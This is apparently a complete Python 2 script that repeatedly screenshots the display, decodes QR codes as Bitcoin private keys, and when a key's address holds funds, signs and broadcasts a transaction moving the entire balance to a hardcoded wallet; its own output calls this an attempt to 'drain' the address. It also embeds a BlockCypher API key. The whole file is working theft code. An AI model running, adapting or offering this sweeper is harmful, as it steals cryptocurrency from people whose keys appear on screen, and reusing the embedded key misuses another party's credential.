#!/bin/env python2
import pyscreenshot as ImageGrab
import libzbar as zb
import blockcypher
from pybitcoin import BitcoinPrivateKey
from pprint import pprint
import time

# myaddress = 'mrrUgJ8pXsAs3FAzUjDnmh9wCffWv2eJCd'  # testkey mycelium
myaddress = '1GN6UHCCrX7GvkTzrP1bUu72amoSgxGMcG'
apikey = "d58627c8b8405c8cf5e3a7b60463d47f"
symbol = 'btc'
fee = blockcypher.get_blockchain_high_fee(coin_symbol=symbol)


class BitcoinTestPrivateKey(BitcoinPrivateKey):
    _pubkeyhash_version_byte = 0x6f


def scanscreen():
    # im = ImageGrab.grab(bbox=(450, 350, 1450, 900))
    im = ImageGrab.grab(bbox=(0, 0, 1920, 1080))
    results = zb.Image.from_im(im).scan()
    del im
    for result in results:
        print("Found result: {}".format(result.data))
        try:
            address, pubkey = details_from_private_key(result.data)
        except:
            continue
        if blockcypher.utils.is_valid_address_for_coinsymbol(address, symbol):
            print("Suspected valid address!! Trying to drain...")
            transferbitcoin(result.data, address, pubkey)


def details_from_private_key(privatekey):
    if symbol == 'btc-testnet':
        pubkey = BitcoinTestPrivateKey(privatekey).public_key()
    else:
        pubkey = BitcoinPrivateKey(privatekey).public_key()
    return (pubkey.address(), pubkey.to_hex())


def transferbitcoin(privatekey, address, pubkey):
    # address, pubkey = details_from_private_key(privatekey)
    details = blockcypher.get_address_details(address, coin_symbol=symbol)
    print("Balance: %d" % details['balance'])
    if not details['balance'] > 1000:
        print("no balance, skipping")
        return
    outputs = [
        {
            'value': details['balance']-fee,
            'address': myaddress,
            # 'script_type': 'pay-to-pubkey-hash',
            # 'script': address_to_script(myaddress),
        }
    ]
    inputs = [{'address': address}]
    pprint(details)
    transaction = blockcypher.create_unsigned_tx(
        inputs, outputs, change_address=myaddress, coin_symbol=symbol)
    pprint(transaction)
    input_addresses = blockcypher.get_input_addresses(transaction)
    privkeys, pubkeys = [], []
    for a in input_addresses:
        assert a == address
        privkeys.append(privatekey)
        pubkeys.append(pubkey)
    signatures = blockcypher.make_tx_signatures(
        transaction['tosign'], privkeys, pubkeys)
    r = blockcypher.broadcast_signed_transaction(
        transaction, signatures, pubkeys, coin_symbol=symbol)
    pprint(r)


def scanloop(modulo_10):
    while True:
        seconds = int(time.time() % 10 - modulo_10)
        if seconds == 0:
            print("Scanning for %d on %d" % (modulo_10, time.time()))
            scanscreen()
        time.sleep(1)


if __name__ == "__main__":
    from multiprocessing import Process
    for i in range(0, 10, 2):
        p = Process(target=scanloop, args=(i,))
        p.start()
